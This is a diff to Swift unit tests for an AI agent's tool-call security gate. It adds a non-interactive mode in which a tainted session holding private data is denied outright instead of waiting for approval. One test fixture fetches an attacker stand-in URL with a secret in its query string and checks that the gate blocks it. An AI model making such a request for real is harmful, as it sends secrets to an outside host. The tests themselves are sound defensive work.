@@ -22,7 +22,8 @@ import Testing
     assemblyPrivate: Bool = false,
     runPrivate: Bool = false,
     grant: OneTurnGrant? = nil,
-    approvalPending: Bool = false
+    approvalPending: Bool = false,
+    nonInteractive: Bool = false
   ) -> ToolDispatchContext {
     ToolDispatchContext(
       sessionTainted: tainted,
@@ -30,7 +31,8 @@ import Testing
       assemblyPrivateData: assemblyPrivate,
       runPrivateData: runPrivate,
       grant: grant,
-      approvalAlreadyPending: approvalPending
+      approvalAlreadyPending: approvalPending,
+      nonInteractive: nonInteractive
     )
   }
 
@@ -241,6 +243,64 @@ import Testing
     }
     #expect(payload.status == .error)
   }
+
+  @Test func nonInteractiveTrifectaHardDeniesWithoutParkingAnApproval() {
+    // given — the exact trifecta state that parks interactively (§10: would-park ⇒ DENY)
+    let gate = makeGate()
+
+    // when
+    let interactive = gate.evaluate(
+      call: fetchCall("https://example.com/a?q=1"),
+      context: makeContext(tainted: true, assemblyPrivate: true)
+    )
+    let nonInteractive = gate.evaluate(
+      call: fetchCall("https://example.com/a?q=1"),
+      context: makeContext(tainted: true, assemblyPrivate: true, nonInteractive: true)
+    )
+
+    // then — interactive still parks; non-interactive DENIES with no pending approval
+    guard case .block(let parkPayload, _, let parkedApproval) = interactive else {
+      Issue.record("expected interactive park, got \(interactive)")
+      return
+    }
+    #expect(parkPayload.status == .blockedPendingApproval)
+    #expect(parkedApproval != nil)
+    guard case .block(let denyPayload, let denyRedacted, nil) = nonInteractive else {
+      Issue.record("expected hard DENY, got \(nonInteractive)")
+      return
+    }
+    #expect(denyPayload.status == .error)
+    #expect(denyPayload.content.contains("needs your approval"))
+    #expect(denyPayload.content.contains("run it interactively"))
+    // The audited args rendering is unchanged in shape — same redacted-args seam field.
+    #expect(denyRedacted == #"{"url":"https://example.com/a?q=1"}"#)
+  }
+
+  @Test func nonInteractiveDenyLeavesEveryEarlierTierUntouched() {
+    // given — tier-1/2 blocks and the outside-trifecta allow behave identically non-interactively
+    let gate = makeGate()
+
+    // when
+    let argBlock = gate.evaluate(
+      call: fetchCall("https://evil.example/?t=s3cret-value-1"),
+      context: makeContext(nonInteractive: true)
+    )
+    let cleanAllow = gate.evaluate(
+      call: fetchCall("https://example.com/a"),
+      context: makeContext(nonInteractive: true)
+    )
+
+    // then
+    guard case .block(let payload, _, nil) = argBlock else {
+      Issue.record("expected blocked args, got \(argBlock)")
+      return
+    }
+    #expect(payload.status == .blockedArgs)
+    guard case .allow = cleanAllow else {
+      Issue.record("expected allow, got \(cleanAllow)")
+      return
+    }
+  }
 }
 
 @Suite struct GatedToolDispatcherTests {
@@ -263,7 +323,8 @@ import Testing
     assemblyPrivateData: false,
     runPrivateData: false,
     grant: nil,
-    approvalAlreadyPending: false
+    approvalAlreadyPending: false,
+    nonInteractive: false
   )
 
   @Test func unknownToolIsAnErrorObservationNeverACrash() async {
